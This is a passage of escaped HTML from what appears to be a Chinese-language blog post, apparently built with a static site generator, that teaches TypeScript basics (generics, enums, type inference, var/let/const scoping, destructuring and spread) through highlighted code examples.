class=\"line\"><span class=\"keyword\">let</span> output = identity&lt;<span class=\"built_in\">string</span>&gt;(<span class=\"string\">&#x27;myString&#x27;</span>) <span class=\"comment\">// type of output will be &#x27;string</span></span><br><span class=\"line\"><span class=\"comment\">// 第二种，利用了类型推论 – 即编译器会根据传入的参数自动地帮助我们确定T的类型</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> output = <span class=\"title function_\">identity</span>(<span class=\"string\">&#x27;myString&#x27;</span>) <span class=\"comment\">// type of output will be &#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>泛型接口</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">GenericIdentityFn</span>&lt;T&gt; &#123;</span><br><span class=\"line\">  (<span class=\"attr\">arg</span>: T): T</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> identity&lt;T&gt;(<span class=\"attr\">arg</span>: T): T &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">myIdentity</span>: <span class=\"title class_\">GenericIdentityFn</span>&lt;<span class=\"built_in\">number</span>&gt; = identity</span><br></pre></td></tr></table></figure>\n\n<p>泛型类</p>\n<p>泛型类使用（&lt;&gt;）括起泛型类型，跟在类名后面。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">GenericNumber</span>&lt;T&gt; &#123;</span><br><span class=\"line\">  <span class=\"attr\">zeroValue</span>: T</span><br><span class=\"line\">  <span class=\"attr\">add</span>: <span class=\"function\">(<span class=\"params\">x: T, y: T</span>) =&gt;</span> T</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> myGenericNumber = <span class=\"keyword\">new</span> <span class=\"title class_\">GenericNumber</span>&lt;<span class=\"built_in\">number</span>&gt;()</span><br><span class=\"line\">myGenericNumber.<span class=\"property\">zeroValue</span> = <span class=\"number\">0</span></span><br><span class=\"line\">myGenericNumber.<span class=\"property\">add</span> = <span class=\"keyword\">function</span> (<span class=\"params\">x, y</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> x + y</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>泛型约束</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Lengthwise</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">length</span>: <span class=\"built_in\">number</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> loggingIdentity&lt;T <span class=\"keyword\">extends</span> <span class=\"title class_\">Lengthwise</span>&gt;(<span class=\"attr\">arg</span>: T): T &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(arg.<span class=\"property\">length</span>) <span class=\"comment\">// Now we know it has a .length property, so no more error</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">loggingIdentity</span>(<span class=\"number\">3</span>) <span class=\"comment\">// Error, number doesn&#x27;t have a .length property</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">loggingIdentity</span>(&#123; <span class=\"attr\">length</span>: <span class=\"number\">10</span>, <span class=\"attr\">value</span>: <span class=\"number\">3</span> &#125;) <span class=\"comment\">// OK</span></span><br></pre></td></tr></table></figure>\n\n<p>在泛型约束中使用类型参数</p>\n<p>可以声明一个类型参数，且它被另一个类型参数所约束。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> getProperty&lt;T, K <span class=\"keyword\">extends</span> keyof T&gt;(<span class=\"attr\">obj</span>: T, <span class=\"attr\">key</span>: K) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> obj[key]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> x = &#123; <span class=\"attr\">a</span>: <span class=\"number\">1</span>, <span class=\"attr\">b</span>: <span class=\"number\">2</span>, <span class=\"attr\">c</span>: <span class=\"number\">3</span>, <span class=\"attr\">d</span>: <span class=\"number\">4</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">getProperty</span>(x, <span class=\"string\">&#x27;a&#x27;</span>) <span class=\"comment\">// okay</span></span><br><span class=\"line\"><span class=\"title function_\">getProperty</span>(x, <span class=\"string\">&#x27;m&#x27;</span>) <span class=\"comment\">// error: Argument of type &#x27;m&#x27; isn&#x27;t assignable to &#x27;a&#x27; | &#x27;b&#x27; | &#x27;c&#x27; | &#x27;d&#x27;.</span></span><br></pre></td></tr></table></figure>\n\n<p>在泛型里使用类类型</p>\n<p>在 TypeScript 使用泛型创建工厂函数时，需要引用构造函数的类类型。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">BeeKeeper</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">hasMask</span>: <span class=\"built_in\">boolean</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ZooKeeper</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">nametag</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">numLegs</span>: <span class=\"built_in\">number</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Bee</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">keeper</span>: <span class=\"title class_\">BeeKeeper</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Lion</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">Animal</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">keeper</span>: <span class=\"title class_\">ZooKeeper</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> createInstance&lt;A <span class=\"keyword\">extends</span> <span class=\"title class_\">Animal</span>&gt;(<span class=\"attr\">c</span>: <span class=\"keyword\">new</span> () =&gt; A): A &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title function_\">c</span>()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">createInstance</span>(<span class=\"title class_\">Lion</span>).<span class=\"property\">keeper</span>.<span class=\"property\">nametag</span> <span class=\"comment\">// typechecks!</span></span><br><span class=\"line\"><span class=\"title function_\">createInstance</span>(<span class=\"title class_\">Bee</span>).<span class=\"property\">keeper</span>.<span class=\"property\">hasMask</span> <span class=\"comment\">// typechecks!</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"枚举-enum\"><a href=\"#枚举-enum\" class=\"headerlink\" title=\"枚举 - enum\"></a>枚举 - enum</h1><p>使用枚举我们可以定义一些有名字的数字常量。枚举通过 <code>enum</code> 关键字来定义。</p>\n<p>枚举是在运行时真正存在的一个对象。其中一个原因是因为这样可以从枚举值到枚举名进行反向映射。生成的代码中，枚举类型被编译成一个对象，它包含双向映射（name -&gt; value）和（value -&gt; name）。 引用枚举成员总会生成一次属性访问并且永远不会内联。</p>\n<p>当访问枚举值时，为了避免生成多余的代码和间接引用，可以使用常数枚举，在 <code>enum</code> 关键字前使用 <code>const</code> 修饰符。常数枚举不可能有计算成员。</p>\n<p>外部枚举用来描述已经存在的枚举类型的形状。外部枚举和非外部枚举之间有一个重要的区别，在正常的枚举里，没有初始化方法的成员被当成常数成员。对于非常数的外部枚举而言，没有初始化方法时被当做需要经过计算的。</p>\n<h1 id=\"类型推论-type-inference\"><a href=\"#类型推论-type-inference\" class=\"headerlink\" title=\"类型推论 - type inference\"></a>类型推论 - type inference</h1><p>当需要从几个表达式中推断类型时候，会使用这些表达式的类型来推断出一个最合适的通用类型。如果没有找到最佳通用类型的话，类型推断的结果为联合数组类型。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/99343202\">优雅的在 vue 中使用 TypeScript</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>按照惯例，先上官方文档</p>\n<p><a href=\"https://typescript.bootcss.com/\">TypeScript 中文手册</a></p>","more":"<h1 id=\"基础类型\"><a href=\"#基础类型\" class=\"headerlink\" title=\"基础类型\"></a>基础类型</h1><h2 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h2><p>TypeScript 支持与 JavaScript 几乎相同的数据类型，此外还提供了实用的枚举类型方便我们使用。</p>\n<ul>\n<li>布尔值 <code>boolean</code></li>\n<li>浮点数 <code>number</code><br>和 JavaScript 一样，TypeScript 里的所有数字都是浮点数</li>\n<li>字符串 <code>string</code><br>双引号 <code>&quot;&quot;</code> 或单引号 <code>&#39;&#39;</code> 表示，<br>还可使用模板字符串，它可以定义多行文本和内嵌表达式。 这种字符串是被反引号 <code>`</code> 包围，并且以 <code>$&#123; expr &#125;</code> 这种形式嵌入表达式</li>\n<li>数组 <code>[]</code> 或数组泛型 <code>Array&lt;元素类型&gt;</code></li>\n<li>元组 <code>Tuple</code><br>元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同。</li>\n<li>枚举 <code>enum</code><br>枚举类型提供的一个便利是你可以由枚举的值得到它的名字。</li>\n<li>任意值 <code>any</code><br>有时候，我们会想要为那些在编程阶段还不清楚类型的变量指定一个类型。 这些值可能来自于动态的内容，比如来自用户输入或第三方代码库。 这种情况下，我们不希望类型检查器对这些值进行检查而是直接让它们通过编译阶段的检查。<br>Object 类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法。</li>\n<li>空值 <code>void</code><br>它表示没有任何类型</li>\n<li><code>null</code> 和 <code>undefined</code><br><code>null</code> 和 <code>undefined</code> 两者各自有自己的类型分别叫做 <code>null</code> 和 <code>undefined</code> 。<br>默认情况下 <code>null</code> 和 <code>undefined</code> 是所有类型的子类型。</li>\n<li><code>never</code><br>表示的是那些永不存在的值的类型。<br>是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是 <code>never</code> 的子类型或可以赋值给 <code>never</code> 类型（除了 <code>never</code> 本身之外）</li>\n</ul>\n<h2 id=\"类型断言\"><a href=\"#类型断言\" class=\"headerlink\" title=\"类型断言\"></a>类型断言</h2><p>类型断言好比其它语言里的类型转换，但是不进行特殊的数据检查和解构。它没有运行时的影响，只是在编译阶段起作用。</p>\n<ul>\n<li>“尖括号”语法 <code>&lt;变量类型&gt;变量值</code></li>\n<li><code>as</code> 语法 <code>变量值 as 变量类型</code></li>\n</ul>\n<p>两种形式是等价的，但当在 TypeScript 里使用 JSX 时，只有 as 语法断言是被允许的。</p>\n<h1 id=\"变量声明\"><a href=\"#变量声明\" class=\"headerlink\" title=\"变量声明\"></a>变量声明</h1><p>let 和 const 是 JavaScript 里相对较新的变量声明方式。 像我们之前提到过的，let 在很多方面与 var 是相似的，但是可以帮助大家避免在 JavaScript 里常见一些问题。 const 是对 let 的一个增强，它能阻止对一个变量再次赋值。</p>\n<h2 id=\"var-声明\"><a href=\"#var-声明\" class=\"headerlink\" title=\"var 声明\"></a><code>var</code> 声明</h2><p><code>var</code> 声明有奇怪的作用域规则，可以在包含它的函数，模块，命名空间或全局作用域内部任何位置被访问，包含它的代码块对此没有什么影响。有些人称此为 var 作用域或函数作用域。函数参数也使用函数作用域。</p>\n<p>文档中的例子：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">f</span>(<span class=\"params\">shouldInitialize: <span class=\"built_in\">boolean</span></span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (shouldInitialize) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> x = <span class=\"number\">10</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> x</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">f</span>(<span class=\"literal\">true</span>) <span class=\"comment\">// returns &#x27;10&#x27;</span></span><br><span class=\"line\"><span class=\"title function_\">f</span>(<span class=\"literal\">false</span>) <span class=\"comment\">// returns &#x27;undefined&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>可能引发的错误：</p>\n<ul>\n<li><p>多次声明同一个变量并不会报错</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 里层的for循环会覆盖变量i，因为所有i都引用相同的函数作用域内的变量</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">sumMatrix</span>(<span class=\"params\">matrix: <span class=\"built_in\">number</span>[][]</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; matrix.<span class=\"property\">length</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> currentRow = matrix[i]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; currentRow.<span class=\"property\">length</span>; i++) &#123;</span><br><span class=\"line\">      sum += currentRow[i]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>变量获取怪异</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i)</span><br><span class=\"line\">  &#125;, <span class=\"number\">100</span> * i)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 期望值： 0 1 2 3 4 5 6 7 8 9</span></span><br><span class=\"line\"><span class=\"comment\">// 实际值： 10 10 10 10 10 10 10 10 10 10</span></span><br></pre></td></tr></table></figure>\n\n<p><code>setTimeout</code> 在若干毫秒后执行一个函数，并且是在 <code>for</code> 循环结束后。 <code>for</code> 循环结束后，<code>i</code> 的值为 <code>10</code>。 所以当函数被调用的时候，它会打印出 <code>10</code>！</p>\n<p>一个通常的解决方法是使用立即执行的函数表达式（IIFE）来捕获每次迭代时 i 的值：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// capture the current state of &#x27;i&#x27;</span></span><br><span class=\"line\">  <span class=\"comment\">// by invoking a function with its current value</span></span><br><span class=\"line\">  ;(<span class=\"keyword\">function</span> (<span class=\"params\">i</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i)</span><br><span class=\"line\">    &#125;, <span class=\"number\">100</span> * i)</span><br><span class=\"line\">  &#125;)(i)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 参数i会覆盖for循环里的i，但是因为我们起了同样的名字，所以我们不用怎么改for循环体里的代码。</span></span><br><span class=\"line\"><span class=\"comment\">// 输出值： 0 1 2 3 4 5 6 7 8 9</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"let-声明\"><a href=\"#let-声明\" class=\"headerlink\" title=\"let 声明\"></a><code>let</code> 声明</h2><p>当用 <code>let</code> 声明一个变量，它使用的是词法作用域或块作用域。</p>\n<ul>\n<li><p>不同于使用 <code>var</code> 声明的变量那样可以在包含它们的函数外访问，块作用域变量在包含它们的块或 <code>for</code> 循环之外是不能访问的。</p>\n</li>\n<li><p>拥有块级作用域的变量的另一个特点是，它们不能在被声明之前读或写。虽然这些变量始终“存在”于它们的作用域里，但在直到声明它的代码之前的区域都属于暂时性死区。</p>\n</li>\n<li><p>但我们仍然可以在一个拥有块作用域变量被声明前获取它，只是我们不能在变量声明前去调用那个函数。</p>\n</li>\n</ul>\n<p>使用 <code>var</code> 声明同名变量时，不管声明多少次，得到的只有 1 个对象。但 <code>let</code> 在一个作用域里的同名变量只能声明一次。</p>\n<h2 id=\"const-声明\"><a href=\"#const-声明\" class=\"headerlink\" title=\"const 声明\"></a><code>const</code> 声明</h2><p>拥有与 <code>let</code> 声明相同的作用域规则，但给变量声明赋值后不能再重新赋值。</p>\n<p><code>const</code> 声明的变量所引用的值是不可变的，但变量的内部状态是可以改变的。</p>\n<p>TypeScript 允许将对象的成员设置成只读。</p>\n<h2 id=\"解构\"><a href=\"#解构\" class=\"headerlink\" title=\"解构\"></a>解构</h2><ul>\n<li><p>解构数组</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 相当于使用索引</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> input = [<span class=\"number\">1</span>, <span class=\"number\">2</span>]</span><br><span class=\"line\"><span class=\"keyword\">let</span> [first, second] = input</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(first) <span class=\"comment\">// outputs 1</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(second) <span class=\"comment\">// outputs 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用...语法创建剩余变量</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> [first, ...rest] = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(first) <span class=\"comment\">// outputs 1</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(rest) <span class=\"comment\">// outputs [ 2, 3, 4 ]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// swap variables</span></span><br><span class=\"line\">;[first, second] = [second, first]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>解构对象</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> o = &#123;</span><br><span class=\"line\">  <span class=\"attr\">a</span>: <span class=\"string\">&#x27;foo&#x27;</span>,</span><br><span class=\"line\">  <span class=\"attr\">b</span>: <span class=\"number\">12</span>,</span><br><span class=\"line\">  <span class=\"attr\">c</span>: <span class=\"string\">&#x27;bar&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> &#123; a, b &#125; = o</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 可以用没有声明的赋值</span></span><br><span class=\"line\">;(&#123; a, b &#125; = &#123; <span class=\"attr\">a</span>: <span class=\"string\">&#x27;baz&#x27;</span>, <span class=\"attr\">b</span>: <span class=\"number\">101</span> &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用...语法创建剩余变量</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> &#123; a, ...passthrough &#125; = o</span><br><span class=\"line\"><span class=\"keyword\">let</span> total = passthrough.<span class=\"property\">b</span> + passthrough.<span class=\"property\">c</span>.<span class=\"property\">length</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>属性重命名</p>\n</li>\n<li><p>默认值</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">keepWholeObject</span>(<span class=\"params\">wholeObject: &#123; a: <span class=\"built_in\">string</span>; b?: <span class=\"built_in\">number</span> &#125;</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; a, b = <span class=\"number\">1001</span> &#125; = wholeObject</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>函数声明</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 指定默认值</span></span><br><span class=\"line\"><span class=\"comment\">// 首先，需要在默认值之前设置其格式。</span></span><br><span class=\"line\"><span class=\"comment\">// 其次，需要在解构属性上给予一个默认或可选的属性用来替换主初始化列表。</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">f</span>(<span class=\"params\">&#123; a, b = <span class=\"number\">0</span> &#125; = &#123; a: <span class=\"string\">&#x27;&#x27;</span> &#125;</span>): <span class=\"built_in\">void</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_\">f</span>(&#123; <span class=\"attr\">a</span>: <span class=\"string\">&#x27;yes&#x27;</span> &#125;) <span class=\"comment\">// ok, default b = 0</span></span><br><span class=\"line\"><span class=\"title function_\">f</span>() <span class=\"comment\">// ok, default to &#123;a: &quot;&quot;&#125;, which then defaults b = 0</span></span><br><span class=\"line\"><span class=\"title function_\">f</span>(&#123;&#125;) <span class=\"comment\">// error, &#x27;a&#x27; is required if you supply an argument</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解构表达式要尽量保持小而简单</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"展开\"><a href=\"#展开\" class=\"headerlink\" title=\"展开\"></a>展开</h2><p>展开操作符正与解构相反。它允许你将一个数组展开为另一个数组，或将一个对象展开为另一个对象。</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 解构数组</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> first = [<span class=\"number\">1</span>, <span class=\"number\">2</span>]</span><br><span class=\"line\"><span class=\"keyword\">let</span> second = [<span class=\"number\">3</span>, <span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"keyword\">let</span> bothPlus = [<span class=\"number\">0</span>, ...first, ...second, <span class=\"number\">5</span>] <span class=\"comment\">// bothPlus = [0, 1, 2, 3, 4, 5]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解构对象</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> defaults = &#123; <span class=\"attr\">food</span>: <span class=\"string\">&#x27;spicy&#x27;</span>, <span class=\"attr\">price</span>: <span class=\"string\">&#x27;$$&#x27;</span>, <span class=\"attr\">ambiance</span>: <span class=\"string\">&#x27;noisy&#x27;</span> &#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> search = &#123; ...defaults, <span class=\"attr\">food</span>: <span class=\"string\">&#x27;rich&#x27;</span> &#125; <span class=\"comment\">// search = &#123; food: &quot;rich&quot;, price: &quot;$$&quot;, ambiance: &quot;noisy&quot; &#125;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>注意</strong></p>\n<ul>\n<li>对象的展开比数组的展开要复杂的多。像数组展开一样，它是从左至右进行处理，但结果仍为对象。这就意味着出现在展开对象后面的属性会覆盖前面的属性。</li>\n<li>对象展开仅包含对象自身的可枚举属性。展开一个对象实例时，会丢失其方法。</li>\n<li>TypeScript 编译器不允许展开泛型函数上的类型参数。</li>\n</ul>\n<h1 id=\"接口-interface\"><a href=\"#接口-interface\" class=\"headerlink\" title=\"接口 - interface\"></a>接口 - interface</h1><p>TypeScript 的核心原则之一是对值所具有的结构进行类型检查。它有时被称做“鸭式辨型法”或“结构性子类型化”。</p>\n<p>在 TypeScript 